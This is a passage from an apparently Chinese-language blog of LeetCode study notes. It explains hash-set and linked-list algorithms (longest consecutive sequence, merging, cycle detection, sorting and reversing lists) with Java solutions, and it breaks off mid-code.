x，考虑以其为起点，不断尝试匹配 $x+1, x+2, \cdots$是否存在，假设最长匹配到了 x+yx+y，那么以 xx 为起点的最长连续序列即为 $x, x+1, x+2, \cdots, x+y$，其长度为 y+1，我们不断枚举并更新答案即可。</p><p>​    对于匹配的过程，暴力的方法是 O(n) 遍历数组去看是否存在这个数，但其实更高效的方法是用一个哈希表存储数组中的数，这样查看一个数是否存在即能优化至 O(1) 的时间复杂度。</p><p>​    仅仅是这样我们的算法时间复杂度最坏情况下还是会达到 $O(n^2)$（即外层需要枚举 O(n) 个数，内层需要暴力匹配 O(n) 次），无法满足题目的要求。但仔细分析这个过程，我们会发现其中执行了很多不必要的枚举，如果已知有一个 $x, x+1, x+2, \cdots, x+y$ 的连续序列，而我们却重新从$ x+1$，$x+2$ 或者是 x+y 处开始尝试匹配，那么得到的结果肯定不会优于枚举 x 为起点的答案，因此我们在外层循环的时候碰到这种情况跳过即可。</p><p>​    那么怎么判断是否跳过呢？由于我们要枚举的数 x 一定是在数组中不存在前驱数 x−1 的，不然按照上面的分析我们会从 x-1开始尝试匹配，因此我们每次在哈希表中检查是否存在 x−1 即能判断是否需要跳过了。</p><p>​    增加了判断跳过的逻辑之后，时间复杂度是多少呢？外层循环需要 O(n) 的时间复杂度，只有当一个数是连续序列的第一个数的情况下才会进入内层循环，然后在内层循环中匹配连续序列中的数，因此<strong>数组中的每个数只会进入内层循环一次</strong>。根据上述分析可知，总时间复杂度为 O(n)，符合题目要求。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestConsecutive</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> longestSeq = <span class="number">0</span>;</span><br><span class="line">    HashSet&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">        set.add(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> num : set)&#123;</span><br><span class="line">        <span class="keyword">int</span> curSeq = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> curNum = num;</span><br><span class="line">        <span class="keyword">if</span>(!set.contains(curNum - <span class="number">1</span>))&#123;</span><br><span class="line">            curSeq = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(set.contains(curNum + <span class="number">1</span>))&#123;</span><br><span class="line">                curNum++;</span><br><span class="line">                curSeq++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        longestSeq = Math.max(longestSeq,curSeq);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> longestSeq;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2-链表"><a href="#2-链表" class="headerlink" title="2. 链表"></a>2. 链表</h1><p>链表的解题基本就是递归和迭代，包括快慢指针的技巧，还可以和排序算法结合。</p><h2 id="2-1-两数相加"><a href="#2-1-两数相加" class="headerlink" title="2.1 两数相加"></a>2.1 两数相加</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用l1链表接收返回结果</span></span><br><span class="line">        ListNode p1 = l1;</span><br><span class="line">        ListNode p2 = l2;</span><br><span class="line">        <span class="keyword">int</span> sums = p1.val + p2.val;</span><br><span class="line">        <span class="comment">//num代表进位数字</span></span><br><span class="line">        <span class="keyword">int</span> num = sums / <span class="number">10</span>;</span><br><span class="line">        <span class="comment">//得到结果时记得对10取余</span></span><br><span class="line">        p1.val = sums % <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">while</span>(p1.next != <span class="keyword">null</span> || p2.next!= <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//除非p1和p2同时为空，否则将快空链表填0</span></span><br><span class="line">            <span class="keyword">if</span>(p1.next == <span class="keyword">null</span>)&#123;</span><br><span class="line">                p1.next = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(p2.next == <span class="keyword">null</span>)&#123;</span><br><span class="line">                p2.next = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            sums = p1.next.val + p2.next.val + num;</span><br><span class="line">            <span class="comment">//num使用后清除，否则影响判断最后是否进位</span></span><br><span class="line">            num = <span class="number">0</span>;</span><br><span class="line">            p1.next.val = (sums % <span class="number">10</span>);</span><br><span class="line">            num = sums / <span class="number">10</span>;</span><br><span class="line">            p1 = p1.next;</span><br><span class="line">            p2 = p2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果当前还剩余进位，p1再填充一位</span></span><br><span class="line">        <span class="keyword">if</span>(num != <span class="number">0</span>)&#123;</span><br><span class="line">            p1.next = <span class="keyword">new</span> ListNode(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> l1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>要注意的点：</p><ol><li>链表长度不一致</li><li>计算进位</li><li>最后还有进位需要在l1上顺延节点</li></ol><h2 id="2-2-删除链表的倒数第N个节点"><a href="#2-2-删除链表的倒数第N个节点" class="headerlink" title="2.2 删除链表的倒数第N个节点"></a>2.2 删除链表的倒数第N个节点</h2><p>如果不为head设前驱节点pre的话，当节点数为1时是无法进行删除的，所以手动添加前驱节点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">removeNthFromEnd</span><span class="params">(ListNode head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//添加前驱节点</span></span><br><span class="line">        ListNode pre = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        pre.next = head;</span><br><span class="line">        <span class="comment">//初始化移动节点，双指针移动,p2先走,p1后走,p为p1的前驱，方便删除</span></span><br><span class="line">        ListNode p1 = head,p2 = head,p = pre;</span><br><span class="line">        <span class="keyword">while</span>(n != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//p2先走n步</span></span><br><span class="line">            p2 = p2.next;</span><br><span class="line">            n--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(p2 != <span class="keyword">null</span>)&#123;</span><br><span class="line">            p2 = p2.next;</span><br><span class="line">            p = p1;</span><br><span class="line">            p1 = p1.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//删除p1</span></span><br><span class="line">        p.next = p1.next;</span><br><span class="line">        <span class="keyword">return</span> pre.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="2-3-合并两个有序链表"><a href="#2-3-合并两个有序链表" class="headerlink" title="2.3 合并两个有序链表"></a>2.3 合并两个有序链表</h2><p>传统解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//合并链表头节点</span></span><br><span class="line">        ListNode head = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">//特殊情况</span></span><br><span class="line">        <span class="keyword">if</span>(l1 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(l2 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//选出头节点</span></span><br><span class="line">        <span class="keyword">if</span>(l1.val &lt;= l2.val)&#123;</span><br><span class="line">            head = l1;</span><br><span class="line">            l1 = l1.next;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            head = l2;</span><br><span class="line">            l2 = l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//迭代比较合并</span></span><br><span class="line">        ListNode l = head;</span><br><span class="line">        <span class="keyword">while</span>(l1 != <span class="keyword">null</span> || l2 != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(l1 == <span class="keyword">null</span>)&#123;</span><br><span class="line">                l.next = l2;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(l2 == <span class="keyword">null</span>)&#123;</span><br><span class="line">                l.next = l1;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(l1.val &lt;= l2.val)&#123;</span><br><span class="line">                l.next = l1;</span><br><span class="line">                l = l.next;</span><br><span class="line">                l1 = l1.next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                l.next = l2;</span><br><span class="line">                l = l.next;</span><br><span class="line">                l2 = l2.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>递归解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回合并后的头节点</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        ListNode l = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(l1 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(l2 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(l1.val &lt;= l2.val)&#123;</span><br><span class="line">            l = l1;</span><br><span class="line">            l1 = l1.next;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            l = l2;</span><br><span class="line">            l2 = l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        l.next = mergeTwoLists(l1,l2);</span><br><span class="line">        <span class="keyword">return</span> l;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="2-4-环形链表"><a href="#2-4-环形链表" class="headerlink" title="2.4 环形链表"></a>2.4 环形链表</h2><p>快慢指针</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        ListNode fast = head;</span><br><span class="line">        ListNode slow = head;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="keyword">null</span> &amp;&amp; fast.next != <span class="keyword">null</span>)&#123;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            <span class="keyword">if</span>(fast == slow)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-环形链表Ⅱ"><a href="#2-5-环形链表Ⅱ" class="headerlink" title="2.5 环形链表Ⅱ"></a>2.5 环形链表Ⅱ</h2><p>​        仍然使用快慢指针，第一次相遇时，设slow走k步，fast走2k步，但是仍然相遇了，说明fast多走的k步正是环的长度。<br>​        假设相遇点距离环起点m步，从head到相遇点为k-m，此时环内继续走k-m也为相遇点，令slow指向head，slow和fast同步走，再次相遇为环起点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">detectCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        ListNode fast = head, slow = head;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="keyword">null</span> &amp;&amp; fast.next != <span class="keyword">null</span>)&#123;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            <span class="keyword">if</span>(fast == slow)&#123;</span><br><span class="line">                <span class="comment">//确定有环，slow重走</span></span><br><span class="line">                slow = head;</span><br><span class="line">                <span class="keyword">while</span>(fast != slow)&#123;</span><br><span class="line">                    fast = fast.next;</span><br><span class="line">                    slow = slow.next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> slow;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="2-6-排序链表"><a href="#2-6-排序链表" class="headerlink" title="2.6 排序链表"></a>2.6 排序链表</h2><p>进阶要求是时间复杂度O(nlogn)，空间复杂度O(1)</p><p>使用归并排序，归并排序的数组排序迭代空间复杂度为O(n)，递归为O(n)</p><p>链表排序迭代空间复杂度O(1)，递归为O(n)</p><p>递归解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">sortList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//分</span></span><br><span class="line">        <span class="comment">//找到中点</span></span><br><span class="line">        ListNode fast = head, slow = head;</span><br><span class="line">        <span class="comment">//slow的前驱结点，用于断链</span></span><br><span class="line">        ListNode preSlow = head;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="keyword">null</span> &amp;&amp; fast.next != <span class="keyword">null</span>)&#123;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            preSlow = slow;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(fast != <span class="keyword">null</span>)&#123;</span><br><span class="line">            preSlow = slow;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        preSlow.next = <span class="keyword">null</span>;</span><br><span class="line">        ListNode left = sortList(head);</span><br><span class="line">        ListNode right = sortList(slow);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//治</span></span><br><span class="line">        <span class="comment">//两个有序链表合并，建立前驱结点排序</span></span><br><span class="line">        ListNode node = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode res = node;</span><br><span class="line">        <span class="keyword">while</span>(left != <span class="keyword">null</span> &amp;&amp; right != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(left.val &lt;= right.val)&#123;</span><br><span class="line">                node.next = left;</span><br><span class="line">                left = left.next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                node.next = right;</span><br><span class="line">                right = right.next;</span><br><span class="line">            &#125;</span><br><span class="line">            node = node.next;</span><br><span class="line">        &#125;</span><br><span class="line">        node.next = left == <span class="keyword">null</span> ? right : left;</span><br><span class="line">        <span class="keyword">return</span> res.next;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>迭代解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">sortList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//初始化变量</span></span><br><span class="line">        ListNode h,h1,h2,res,pre;</span><br><span class="line">        h = head;</span><br><span class="line">        res = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        res.next = head;</span><br><span class="line">        <span class="keyword">int</span> length = <span class="number">0</span>,step = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(h != <span class="keyword">null</span>)&#123;</span><br><span class="line">            length++;</span><br><span class="line">            h = h.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//迭代合并</span></span><br><span class="line">        <span class="keyword">while</span> (step &lt; length) &#123;</span><br><span class="line">            pre = res;</span><br><span class="line">            h = res.next;</span><br><span class="line">            <span class="keyword">while</span>(h != <span class="keyword">null</span>)&#123;</span><br><span class="line">                h1 = h;</span><br><span class="line">                <span class="keyword">int</span> i = step;</span><br><span class="line">                <span class="keyword">while</span>(i &gt; <span class="number">0</span> &amp;&amp; h != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    h = h.next;</span><br><span class="line">                    i--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(i &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="comment">//此时不足one step</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                h2 = h;</span><br><span class="line">                i = step;</span><br><span class="line">                <span class="keyword">while</span>(i &gt; <span class="number">0</span> &amp;&amp; h != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    h = h.next;</span><br><span class="line">                    i--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//合并两组中前一组长度step，后一组step-i</span></span><br><span class="line">                <span class="keyword">int</span> len1 = step,len2 = step - i;</span><br><span class="line">                <span class="comment">//开始合并,有序链表合并</span></span><br><span class="line">                <span class="keyword">while</span>(len1 &gt; <span class="number">0</span> &amp;&amp; len2 &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(h1.val &lt;= h2.val)&#123;</span><br><span class="line">                        len1--;</span><br><span class="line">                        pre.next = h1;</span><br><span class="line">                        h1 = h1.next;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        len2--;</span><br><span class="line">                        pre.next = h2;</span><br><span class="line">                        h2 = h2.next;</span><br><span class="line">                    &#125;</span><br><span class="line">                    pre = pre.next;</span><br><span class="line">                &#125;</span><br><span class="line">                pre.next = len1 == <span class="number">0</span> ? h2 : h1;</span><br><span class="line">                <span class="keyword">while</span>(len1 &gt; <span class="number">0</span> || len2 &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    pre = pre.next;</span><br><span class="line">                    len1--;</span><br><span class="line">                    len2--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//把当前合并链表尾节点和下一个待合并链表头节点连接</span></span><br><span class="line">                pre.next = h;</span><br><span class="line">                </span><br><span class="line">            &#125;    </span><br><span class="line">            step *= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="2-7-相交链表"><a href="#2-7-相交链表" class="headerlink" title="2.7 相交链表"></a>2.7 相交链表</h2><p>剑指offer相遇解法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(headA == headB)&#123;</span><br><span class="line">            <span class="keyword">return</span> headA;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode node1 = headA;</span><br><span class="line">        ListNode node2 = headB;</span><br><span class="line">        <span class="keyword">boolean</span> flag1 = <span class="keyword">true</span>,flag2 = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">while</span>(node1!=<span class="keyword">null</span> || node2 != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(node1 != <span class="keyword">null</span>)&#123;</span><br><span class="line">                node1 = node1.next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(flag1)&#123;</span><br><span class="line">                    node1 = headB;</span><br><span class="line">                    flag1 = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node2 != <span class="keyword">null</span>)&#123;</span><br><span class="line">                node2 = node2.next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(flag2)&#123;</span><br><span class="line">                    node2 = headA;    </span><br><span class="line">                &#125;</span><br><span class="line">                flag2 = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node1 == node2)&#123;</span><br><span class="line">                <span class="keyword">return</span> node1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="2-8-反转链表"><a href="#2-8-反转链表" class="headerlink" title="2.8 反转链表"></a>2.8 反转链表</h2><p>迭代解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode node = head.next;</span><br><span class="line">        ListNode tmp = <span class="keyword">null</span>;</span><br><span class="line">        head.next = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(node.next != <span class="keyword">null</span>)&#123;</span><br><span class="line">            tmp = node.next;</span><br><span class="line">            node.next = head;</span><br><span class="line">            head = node;</span><br><span class="line">            node = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        node.next = head;</span><br><span class="line">        head = node;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>递归解法：</p><p>更简洁，但会有O(N)的空间复杂度</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> 